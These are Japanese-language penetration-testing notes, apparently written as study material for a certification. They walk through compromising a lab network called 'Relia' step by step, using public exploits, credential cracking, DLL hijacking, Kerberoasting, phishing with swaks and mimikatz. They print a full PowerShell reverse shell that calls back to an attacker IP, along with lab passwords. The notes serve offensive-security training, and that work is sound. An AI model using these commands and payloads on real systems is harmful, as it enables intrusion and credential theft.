1. 外部公開Webサーバー(VM10: WEB01)にアクセスし、Apache 2.4.49のPath Travarsalの脆弱性（[CVE-2021-41773](https://www.exploit-db.com/exploits/50383)）を使い、anitaユーザーのid_rsaを抽出し、ssh2johnを用いてパスフレーズを解析

2. anitaでVM10の内部を列挙し、LinPEASを実行すると、Sudoの脆弱性([Baron Samedit - CVE-2021-3156](https://github.com/worawit/CVE-2021-3156))を利用できるとあり、これで権限昇格
	- 95% PE vectorのエクスプロイト(CVE-2021-3560)がサジェストされたが、これは誤検出で、時間を要した（このエクスプロイトは度々誤検出する）
	- →95%でも誤検出の可能性があるため、他のエクスプロイトを切り捨てずに検証する

3. VM10のrootコンテキストで`ls -la`で列挙すると、id_ecdsaというSSH秘密鍵が見つかったので、これでパスワードスプレーしたところ、VM11(demo)で有効なことがわかる
```zsh
nxc ssh 192.168.xxx.246 --key-file id_ecdsa -u anita -p fireball --port 2222 --no-bruteforce
```
- `-la`オプションは必ずつけて列挙する

4. VM11にanitaでログインし、ローカルサービスを用いてLFIして、www-dataを侵害。www-dataがsudo権限をもっていたため、rootに昇格
	- web shellでrootはありえない（webサーバーはwww-dataやiisで動作する）が、web shellで侵害したユーザーが特権を持っていることは多くあり、そこから簡単にPEできることを念頭におく

5. VM12(web02)ではftpのanonymousログインが可能であり、そこでUmbracoというCMSのRCE脆弱性（[49488.py](https://www.exploit-db.com/exploits/49488)）を利用し、appユーザーを侵害
	- ==ドメイン名がわかったら`/etc/hosts`に登録して再度Nmapスキャン==

6. VM12のappで列挙したところxamppのhttpd.exe動作ディレクトリが書き込み可能であり、存在しないDLLがあったため、DLL hijackingでNT Authorityを侵害
	- NT Authorityでとりあえずmimikatzをし、ダンプされたローカルAdministratorのハッシュをクラックしようとして時間を無駄にした
	- すでに特権獲得していて、mimikatzでダンプした認証情報が`Domain : <local>`であれば、クラックの必要はない

7. VM13(External)でSMBを列挙すると、guest認証が可能で、Database.kdbxを確認したので、keepass2johnでフォーマットしてからクラックし、emmaの認証情報を抽出してRDP接続

8. emmaでVM13を確認したところ、スケジュールタスクとその実行ログを確認でき、実行ログからどのDLLが存在しないかを確かめられたので、悪意あるDLLを配置し、DLL hijackingで権限昇格→rabbit holeで、実際は`env`でアプリケーションが使用する認証情報を環境変数から入手した（`AppKey  !8@aBRBYdb3!`）

9. VM14(legacy)でhttpサービスが有効になっていたので、Gobusterでディレクトリディスカバリをしたところ、cmsディレクトリがあったため、さらにcmsディレクトリを列挙し、RiteCMSのログインフォームを発見

10. VM14のログインフォームに`admin:admin`でログイン成功したので、RiteCMSのRCE脆弱性 - 認証あり（[50614.py](https://www.exploit-db.com/exploits/50614)）を使ってadrianユーザーのリバースシェルを獲得

11. VM14でPowerShellのヒストリーファイルを閲覧し、damonユーザーのパスワードを入手したので、権限昇格したが、権限がまだ十分ではない

12. gitでwebサーバーを管理していることがわかったので、コミットログを確認し、JIMユーザーのメールアドレスと、MAIL SERVERのメールアドレス、パスワードを入手

13. 入手したMAIL SERVERの認証情報と、VM2(MAIL)というメールサーバーがあることから、JIMユーザーへWebDavと.lnkを活用したフィッシングメールを送付し、VM4(WK01)のリバースシェル獲得
```zsh
swaks --to jim@relia.com --from maildmz@relia.com --attach @config.library-ms --server 192.168.154.189 --body @body.txt --header "Subject: Please Review the Attached File" -ap
```

14. VM4のJIMでDatabase.kdbxを確認し、クラックして、JIMとdmzadminの認証情報を抽出
	- ひたすらADユーザーのJIMの認証情報でスプレーしていたが、無駄だった
	- ==一通りのネットワークプロトコルでスプレーし、Pwn3d!と表示されなければ、一旦他のマシンの列挙に映ること==
	- ADユーザーを侵害したら、必ず一度==AS-REP roastingとKerberoastingを実行すること==

15. dmzadminの認証情報でVM3を侵害し、内部NWへのインターフェースがあったので、トンネリング

16. VM4でJIMユーザーでAS-ReproastingとKerberoastingをしたところ、Webbyのiis_serviceのパスワードハッシュとMICHELLEユーザーのパスワードハッシュを入手し、MICHELLEのハッシュはクラックできた

17. MICHELLEをBloodHoundで確認すると、INTRANETRDPというグループに所属していたため、VM15(INTRANET)へRDP接続

18. INTRANETでサービスとして実行されているexeにDLL hijackが可能そうであることがわかったため、WINPREPマシンに持っていき、サービスとして実行した上でProcmonで確認し、DLLを特定→権限昇格し、intranet\administratorを侵害
	- MySQLでデータベースからadminのパスワードハッシュを入手して、2時間かかるのにクラック試行していた→==クラックに5分以上かかるときは別の攻撃ベクターを探索==
	- ProcmonでDLLのローディングを確認するときは==実環境を真似てから実行すること==

19. andreaというユーザーがVM15(INTRANET)にセッションをもっていることをBloodHoundで確認できていたため、intranet\administratorでmimikatzを使ってパスワードハッシュをダンプし、andreaの認証情報を入手

20. andreaがWKRDPというグループに所属していたため、VM6(WK02)へRDP接続して列挙したところ、スケジュールタスクが一般ユーザーでも編集可能なPowerShellスクリプトを実行していたため、PowerShellスクリプトを以下に改変し、上書きしてmilanaユーザーに権限昇格
```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.45.157",5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

21. milanaで再度インストール済みアプリケーションを列挙したところ、KeePassを使っていたため、Database.kdbxを探してクラックし、sarahユーザーの秘密鍵とパスフレーズを入手
	- ==権限昇格後も、興味深い情報、インストール済みアプリケーションを列挙すること
	- ==慌てた時は、基本に立ち返り、着実な列挙をすること==

22. VM7(backup)にsarahでログインし、`sudo -l`としたところ、borgbackupというアプリケーションがパスワードなしで利用できると、以下のように表示
```zsh
sarah@backup:~$ sudo -l
Matching Defaults entries for sarah on backup:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sarah may run the following commands on backup:
    (ALL) NOPASSWD: /usr/bin/borg list *
    (ALL) NOPASSWD: /usr/bin/borg extract *
    (ALL) NOPASSWD: /usr/bin/borg mount *
```

23. `sudo borg list`としたところ、パスフレーズの入力を求められたため、`pspy`でプロセスを1秒単位で列挙したところ、パスフレーズを入手
```zsh
./pspy64 -p -i 1000
```

24. 入手したパスフレーズを用いて、borgのバックアップの中身を確認したところ、amyのパスワードハッシュとandrewのパスワードを入手できた
```zsh
sudo borg list /opt/borgbackup/
Enter passphrase for key /opt/borgbackup: 
home                                 Mon, 2022-10-17 22:29:47 [680a2deb3b958081ac2b5a28e9c0fa1735c0bd8eb7323cf0ffbb3579b4fd5d4d]
...
sudo borg extract /opt/borgbackup/::home --stdout
Enter passphrase for key /opt/borgbackup: 

...
sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.6.20:/etc/ /opt/backup/etc/
{
    "user": "amy",
    "pass": "0814b6b7f0de51ecf54ca5b6e6e612bf"
}
```

25. VM7のamyのパスワードハッシュをクラックし、`su amy`として権限昇格

26. VM8にandrewユーザーの認証情報でSSH接続し、列挙したところ、LinPEASの結果で`DOAS`が使えるとあった
	- DOASとは、OpenBSDにおけるSudo
	- proof.txtが低権限のandrewでも閲覧できたが、==rootフラグが読めても、権限昇格しないと試験上は得点にならないし、rootでしか読めないファイルがあるなら確実に権限昇格する必要あり（最初からrootの場合は除く）==

27. DOASで実行できるものを、doas.confで確認したところ、andrewでapacheサーバーをroot権限で起動できるとあった
```zsh
permit nopass andrew as root cmd service args apache24 onestart
```

28. Apacheをroot権限で起動し、`*:80`でアクセスできるようになったので、ブラウザでアクセスしたところ、`/www/apache24/data`がルートディレクトリであることがわかったので、ルートディレクトリ配下で書き込み可能なディレクトリにphpのrevshell payload(pentest monkey)を書き込み、アクセス
```zsh
doas -r root service apache24 onestart
curl http://127.0.0.1/phpMyAdmin/tmp/revshell.php
```

29. VM8でwheelとしてリバースシェルを獲得し、このユーザーがdoasでrootとしてなんでも実行できるとあるので、権限昇格し、MOUNTUSERの`.history`ファイルを閲覧したところ、MOUNTUSERのパスワードを入手

30. MOUNTUSERの認証情報で、スプレーしたところ、VM9(FILES)のSMBでmonitoringというSMB shareのREAD権限があり、そこにはPowerShell transcriptのログが残っており、Administratorのパスワードを入手

31. Administratorのパスワードでevil-winrm接続していき、すべてのマシンを侵害
```zsh
evil-winrm -i 192.168.215.189 -u 'Relia\Administrator' -p 'vau!XCKjNQBv2$'
```